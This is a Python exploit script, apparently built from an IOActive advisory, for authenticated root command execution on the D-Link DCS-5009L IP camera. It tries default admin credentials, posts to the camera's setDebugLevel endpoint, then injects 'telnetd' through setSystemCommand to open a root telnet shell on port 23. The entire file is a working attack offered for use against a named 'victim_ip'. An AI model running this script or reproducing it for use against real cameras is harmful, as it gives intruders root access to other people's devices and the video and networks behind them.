"""
https://ioactive.com/wp-content/uploads/2018/05/IOActive_Advisory_D-Link_DCS-5009L_IP_Camera.pdf
"""

import requests
from requests.auth import HTTPBasicAuth
import os, sys, subprocess
import logging
import httplib2

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green


def DLink_Auth_RCE(victim_ip):
    try:
        # perform RCE and check if payload sent successfully
        exploit_result = os_command_execution(victim_ip)
        if exploit_result:
            print(G+'Authenticated Root OS Command Execution exploit successful! Telnet service has been successfully started on Port 23.'+W)
            return 'Authenticated Root OS Command Execution exploit successful! Telnet service has been successfully started on Port 23.'
        else:
            print(R+'Authenticated Root OS Command Execution exploit failed!'+W)
            return 'Authenticated Root OS Command Execution exploit failed!'
    except KeyboardInterrupt:
        print('\n' + 'Program exiting...')
        sys.exit()



def os_command_execution(victim_ip):
    # port = input("Please enter the port number to exploit (default = '80') : ") or '80'
    username = input("Please enter the username (default = 'admin') : ") or "admin"
    password = input("Please enter the password (default = blank) : ") or ""
    try:
        data = {
        'ReplySuccessPage': 'advanced.htm',
        'ReplyErrorPage': 'errradv.htm',
        'WebDebugLevel': '0',
        'WebFuncLevel': '1180250000'
        }
        url1 = 'http://admin@%s/setDebugLevel' % (victim_ip)
        response = requests.post(url1, data=data , auth=HTTPBasicAuth(username, password))
        data2 = {
        'ReplySuccessPage': 'home.htm',
        'ReplyErrorPage': 'errradv.htm',
        'SystemCommand': 'telnetd',
        'ConfigSystemCommand': 'test'
        }
        url2 = 'http://admin@%s/setSystemCommand' % (victim_ip)
        response2 = requests.post(url2, data=data2, auth=HTTPBasicAuth(username, password))
        logging.debug('setDebugLevel URL : ' + str(url1))
        logging.debug('setSystemCommand URL: ' + str(url2))
        if str(response.status_code) == '200' and str(response2.status_code) == '200':
            return True
        else:
            return False
    except:
        e = sys.exc_info()[1]
        print(R+"Error: %s" % e +W)
        return False
